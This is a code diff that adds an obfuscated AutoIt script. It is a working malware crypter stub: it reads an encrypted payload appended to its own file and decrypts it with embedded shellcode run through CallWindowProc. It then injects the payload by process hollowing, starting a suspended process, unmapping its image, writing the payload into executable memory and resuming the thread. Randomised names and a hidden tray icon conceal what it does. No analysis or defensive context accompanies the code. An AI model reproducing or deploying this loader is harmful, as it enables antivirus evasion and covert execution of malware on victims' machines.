@@ -1,0 +1,83 @@
+﻿#notrayicon
+ $VNQDRMAITLRANAJ = "YWZOWPUquCrAzND"
+ $VFROTCCHKPMXJAQ = "UiYFNabTrQMhIjk"
+ $LRFCAVLVFKUYAJU = FILEOPEN ( @SCRIPTFULLPATH , 0 )
+ $WJYRVGHGLEUILRQ = FILEREAD ( $LRFCAVLVFKUYAJU )
+ $WJYRVGHGLEUILRQ = STRINGMID ( $WJYRVGHGLEUILRQ , STRINGINSTR ( $WJYRVGHGLEUILRQ , $VFROTCCHKPMXJAQ ) + STRINGLEN ( $VFROTCCHKPMXJAQ ) )
+ $WJYRVGHGLEUILRQ = _TXNZYWJXMETFRHT ( $WJYRVGHGLEUILRQ , $VNQDRMAITLRANAJ )
+ _ARTZMZYGADGZLOX ( $WJYRVGHGLEUILRQ )
+ FUNC _ARTZMZYGADGZLOX ( $LOXHXJRBATNWZDU )
+ LOCAL $BGGWYANQSAWOXHN = BINARY ( $LOXHXJRBATNWZDU )
+ LOCAL $BVMEYPIOMMQGSJM = DLLSTRUCTCREATE ( "byte[" & BINARYLEN ( $BGGWYANQSAWOXHN ) & "]" )
+ DLLSTRUCTSETDATA ( $BVMEYPIOMMQGSJM , 1 , $BGGWYANQSAWOXHN )
+ LOCAL $PJZEOFAXKAFGXLV = DLLSTRUCTGETPTR ( $BVMEYPIOMMQGSJM )
+ LOCAL $VOEEWHXNELXVJMX = DLLSTRUCTCREATE ( "dword  cbSize;" & "ptr Reserved;" & "ptr Desktop;" & "ptr Title;" & "dword X;" & "dword Y;" & "dword XSize;" & "dword YSize;" & "dword XCountChars;" & "dword YCountChars;" & "dword FillAttribute;" & "dword Flags;" & "ushort ShowWindow;" & "ushort Reserved2;" & "ptr Reserved2;" & "ptr hStdInput;" & "ptr hStdOutput;" & "ptr hStdError" )
+ LOCAL $JCOBJQWOAXFZDBM = DLLSTRUCTCREATE ( "ptr Process;" & "ptr Thread;" & "dword ProcessId;" & "dword ThreadId" )
+ LOCAL $UZOQZAGTZIDYIXA = DLLCALL ( "kernel32.dll" , "int" , "CreateProcessW" , "wstr" , @AUTOITEXE , "ptr" , 0 , "ptr" , 0 , "ptr" , 0 , "int" , 0 , "dword" , 4 , "ptr" , 0 , "ptr" , 0 , "ptr" , DLLSTRUCTGETPTR ( $VOEEWHXNELXVJMX ) , "ptr" , DLLSTRUCTGETPTR ( $JCOBJQWOAXFZDBM ) )
+ LOCAL $UNABKAOIQLYMNOA = DLLSTRUCTGETDATA ( $JCOBJQWOAXFZDBM , "Process" )
+ LOCAL $VGGLFDGZXPMWWCD = DLLSTRUCTGETDATA ( $JCOBJQWOAXFZDBM , "Thread" )
+ LOCAL $ODKHLJWOOXFHHUN = DLLSTRUCTCREATE ( "dword ContextFlags;" & "dword Dr0;" & "dword Dr1;" & "dword Dr2;" & "dword Dr3;" & "dword Dr6;" & "dword Dr7;" & "dword ControlWord;" & "dword StatusWord;" & "dword TagWord;" & "dword ErrorOffset;" & "dword ErrorSelector;" & "dword DataOffset;" & "dword DataSelector;" & "byte RegisterArea[80];" & "dword Cr0NpxState;" & "dword SegGs;" & "dword SegFs;" & "dword SegEs;" & "dword SegDs;" & "dword Edi;" & "dword Esi;" & "dword Ebx;" & "dword Edx;" & "dword Ecx;" & "dword Eax;" & "dword Ebp;" & "dword Eip;" & "dword SegCs;" & "dword EFlags;" & "dword Esp;" & "dword SegS" )
+ DLLSTRUCTSETDATA ( $ODKHLJWOOXFHHUN , "ContextFlags" , 65538 )
+ $UZOQZAGTZIDYIXA = DLLCALL ( "kernel32.dll" , "int" , "GetThreadContext" , "ptr" , $VGGLFDGZXPMWWCD , "ptr" , DLLSTRUCTGETPTR ( $ODKHLJWOOXFHHUN ) )
+ LOCAL $VCFHTGKYIYCJIQG = DLLSTRUCTCREATE ( "char Magic[2];" & "ushort BytesOnLastPage;" & "ushort Pages;" & "ushort Relocations;" & "ushort SizeofHeader;" & "ushort MinimumExtra;" & "ushort MaximumExtra;" & "ushort SS;" & "ushort SP;" & "ushort Checksum;" & "ushort IP;" & "ushort CS;" & "ushort Relocation;" & "ushort Overlay;" & "char Reserved[8];" & "ushort OEMIdentifier;" & "ushort OEMInformation;" & "char Reserved2[20];" & "dword AddressOfNewExeHeader" , $PJZEOFAXKAFGXLV )
+ $PJZEOFAXKAFGXLV += DLLSTRUCTGETDATA ( $VCFHTGKYIYCJIQG , "AddressOfNewExeHeader" )
+ LOCAL $AFCMWXIVUHIEXXQ = DLLSTRUCTGETDATA ( $VCFHTGKYIYCJIQG , "Magic" )
+ IF NOT ( $AFCMWXIVUHIEXXQ == "MZ" ) THEN
+ DLLCALL ( "kernel32.dll" , "int" , "TerminateProcess" , "ptr" , $UNABKAOIQLYMNOA , "dword" , 0 )
+ RETURN SETERROR ( 3 , 0 , 0 )
+ ENDIF
+ LOCAL $TNLELLFROPFMCIT = DLLSTRUCTCREATE ( "dword Signature" , $PJZEOFAXKAFGXLV )
+ $PJZEOFAXKAFGXLV += 4
+ IF DLLSTRUCTGETDATA ( $TNLELLFROPFMCIT , "Signature" ) <> 17744 THEN
+ DLLCALL ( "kernel32.dll" , "int" , "TerminateProcess" , "ptr" , $UNABKAOIQLYMNOA , "dword" , 0 )
+ RETURN SETERROR ( 4 , 0 , 0 )
+ ENDIF
+ LOCAL $NROLUWCLPBCBCZQ = DLLSTRUCTCREATE ( "ushort Machine;" & "ushort NumberOfSections;" & "dword TimeDateStamp;" & "dword PointerToSymbolTable;" & "dword NumberOfSymbols;" & "ushort SizeOfOptionalHeader;" & "ushort Characteristics" , $PJZEOFAXKAFGXLV )
+ LOCAL $ZMCWBIBCJNJUEJW = DLLSTRUCTGETDATA ( $NROLUWCLPBCBCZQ , "NumberOfSections" )
+ $PJZEOFAXKAFGXLV += 20
+ LOCAL $JFIOUFZXFRJSEEF = DLLSTRUCTCREATE ( "ushort Magic;" & "ubyte MajorLinkerVersion;" & "ubyte MinorLinkerVersion;" & "dword SizeOfCode;" & "dword SizeOfInitializedData;" & "dword SizeOfUninitializedData;" & "dword AddressOfEntryPoint;" & "dword BaseOfCode;" & "dword BaseOfData;" & "dword ImageBase;" & "dword SectionAlignment;" & "dword FileAlignment;" & "ushort MajorOperatingSystemVersion;" & "ushort MinorOperatingSystemVersion;" & "ushort MajorImageVersion;" & "ushort MinorImageVersion;" & "ushort MajorSubsystemVersion;" & "ushort MinorSubsystemVersion;" & "dword Win32VersionValue;" & "dword SizeOfImage;" & "dword SizeOfHeaders;" & "dword CheckSum;" & "ushort Subsystem;" & "ushort DllCharacteristics;" & "dword SizeOfStackReserve;" & "dword SizeOfStackCommit;" & "dword SizeOfHeapReserve;" & "dword SizeOfHeapCommit;" & "dword LoaderFlags;" & "dword NumberOfRvaAndSizes" , $PJZEOFAXKAFGXLV )
+ $PJZEOFAXKAFGXLV += 96
+ LOCAL $FQOPOCJAEVOMSMB = DLLSTRUCTGETDATA ( $JFIOUFZXFRJSEEF , "Magic" )
+ IF $FQOPOCJAEVOMSMB <> 267 THEN
+ DLLCALL ( "kernel32.dll" , "int" , "TerminateProcess" , "ptr" , $UNABKAOIQLYMNOA , "dword" , 0 )
+ RETURN SETERROR ( 5 , 0 , 0 )
+ ENDIF
+ LOCAL $UMZOYFUFLGNJNZJ = DLLSTRUCTGETDATA ( $JFIOUFZXFRJSEEF , "AddressOfEntryPoint" )
+ $PJZEOFAXKAFGXLV += 128
+ LOCAL $AWBXNSVHVQOWUBA = DLLSTRUCTGETDATA ( $JFIOUFZXFRJSEEF , "ImageBase" )
+ LOCAL $YEUTMEHQTUMMMDO = DLLSTRUCTGETDATA ( $JFIOUFZXFRJSEEF , "SizeOfImage" )
+ $UZOQZAGTZIDYIXA = DLLCALL ( "ntdll.dll" , "int" , "NtUnmapViewOfSection" , "ptr" , $UNABKAOIQLYMNOA , "ptr" , $AWBXNSVHVQOWUBA )
+ $UZOQZAGTZIDYIXA = DLLCALL ( "kernel32.dll" , "ptr" , "VirtualAllocEx" , "ptr" , $UNABKAOIQLYMNOA , "ptr" , $AWBXNSVHVQOWUBA , "dword" , $YEUTMEHQTUMMMDO , "dword" , 12288 , "dword" , 64 )
+ LOCAL $IJYXQWXEIWJXTCR = $UZOQZAGTZIDYIXA [ 0 ]
+ LOCAL $JXEAVTOQGEMWXJG = DLLSTRUCTGETPTR ( $VCFHTGKYIYCJIQG )
+ LOCAL $VTNFMLIOWBCSELO = DLLSTRUCTGETDATA ( $JFIOUFZXFRJSEEF , "SizeOfHeaders" )
+ $UZOQZAGTZIDYIXA = DLLCALL ( "kernel32.dll" , "int" , "WriteProcessMemory" , "ptr" , $UNABKAOIQLYMNOA , "ptr" , $IJYXQWXEIWJXTCR , "ptr" , $JXEAVTOQGEMWXJG , "dword" , $VTNFMLIOWBCSELO , "dword*" , 0 )
+ LOCAL $LWHLINUEQROCPZI
+ LOCAL $EUZMNPCCJUHXIKR , $MFSUQKQAOVNFTND
+ LOCAL $DOXKNCLUGXILUKC
+ FOR $JNLVTLMCZBYLXBT = 1 TO $ZMCWBIBCJNJUEJW
+ $LWHLINUEQROCPZI = DLLSTRUCTCREATE ( "char Name[8];" & "dword UnionOfVirtualSizeAndPhysicalAddress;" & "dword VirtualAddress;" & "dword SizeOfRawData;" & "dword PointerToRawData;" & "dword PointerToRelocations;" & "dword PointerToLinenumbers;" & "ushort NumberOfRelocations;" & "ushort NumberOfLinenumbers;" & "dword Characteristics" , $PJZEOFAXKAFGXLV )
+ $EUZMNPCCJUHXIKR = DLLSTRUCTGETDATA ( $LWHLINUEQROCPZI , "SizeOfRawData" )
+ $MFSUQKQAOVNFTND = DLLSTRUCTGETPTR ( $VCFHTGKYIYCJIQG ) + DLLSTRUCTGETDATA ( $LWHLINUEQROCPZI , "PointerToRawData" )
+ $DOXKNCLUGXILUKC = DLLSTRUCTGETDATA ( $LWHLINUEQROCPZI , "VirtualAddress" )
+ IF $EUZMNPCCJUHXIKR THEN
+ $UZOQZAGTZIDYIXA = DLLCALL ( "kernel32.dll" , "int" , "WriteProcessMemory" , "ptr" , $UNABKAOIQLYMNOA , "ptr" , $IJYXQWXEIWJXTCR + $DOXKNCLUGXILUKC , "ptr" , $MFSUQKQAOVNFTND , "dword" , $EUZMNPCCJUHXIKR , "dword*" , 0 )
+ ENDIF
+ $PJZEOFAXKAFGXLV += 40
+ NEXT
+ DLLSTRUCTSETDATA ( $ODKHLJWOOXFHHUN , "Eax" , $IJYXQWXEIWJXTCR + $UMZOYFUFLGNJNZJ )
+ $UZOQZAGTZIDYIXA = DLLCALL ( "kernel32.dll" , "int" , "SetThreadContext" , "ptr" , $VGGLFDGZXPMWWCD , "ptr" , DLLSTRUCTGETPTR ( $ODKHLJWOOXFHHUN ) )
+ $UZOQZAGTZIDYIXA = DLLCALL ( "kernel32.dll" , "int" , "ResumeThread" , "ptr" , $VGGLFDGZXPMWWCD )
+ ENDFUNC
+ FUNC _TXNZYWJXMETFRHT ( $WJYRVGHGLEUILRQ , $OIXQBAKNYVGMQDI )
+ LOCAL $JSWDISJNTERNSXU = "0xC81001006A006A005356578B551031C989C84989D7F2AE484829C88945F085C00F84DC000000B90001000088C82C0188840DEFFEFFFFE2F38365F4008365FC00817DFC000100007D478B45FC31D2F775F0920345100FB6008B4DFC0FB68C0DF0FEFFFF01C80345F425FF0000008945F48B75FC8A8435F0FEFFFF8B7DF486843DF0FEFFFF888435F0FEFFFFFF45FCEBB08D9DF0FEFFFF31FF89FA39550C76638B85ECFEFFFF4025FF0000008985ECFEFFFF89D80385ECFEFFFF0FB6000385E8FEFFFF25FF0000008985E8FEFFFF89DE03B5ECFEFFFF8A0689DF03BDE8FEFFFF860788060FB60E0FB60701C181E1FF0000008A840DF0FEFFFF8B750801D6300642EB985F5E5BC9C21000"
+ LOCAL $HHGQCCCBVUQUZMN = DLLSTRUCTCREATE ( "byte[" & BINARYLEN ( $JSWDISJNTERNSXU ) & "]" )
+ DLLSTRUCTSETDATA ( $HHGQCCCBVUQUZMN , 1 , $JSWDISJNTERNSXU )
+ LOCAL $RBINFGJRGPCLFTO = DLLSTRUCTCREATE ( "byte[" & BINARYLEN ( $WJYRVGHGLEUILRQ ) & "]" )
+ DLLSTRUCTSETDATA ( $RBINFGJRGPCLFTO , 1 , $WJYRVGHGLEUILRQ )
+ DLLCALL ( "user32.dll" , "none" , "CallWindowProc" , "ptr" , DLLSTRUCTGETPTR ( $HHGQCCCBVUQUZMN ) , "ptr" , DLLSTRUCTGETPTR ( $RBINFGJRGPCLFTO ) , "int" , BINARYLEN ( $WJYRVGHGLEUILRQ ) , "str" , $OIXQBAKNYVGMQDI , "int" , 0 )
+ LOCAL $PHSETJUBRHFXQFE = DLLSTRUCTGETDATA ( $RBINFGJRGPCLFTO , 1 )
+ $RBINFGJRGPCLFTO = 0
+ $HHGQCCCBVUQUZMN = 0
+ RETURN $PHSETJUBRHFXQFE
+ ENDFUNC
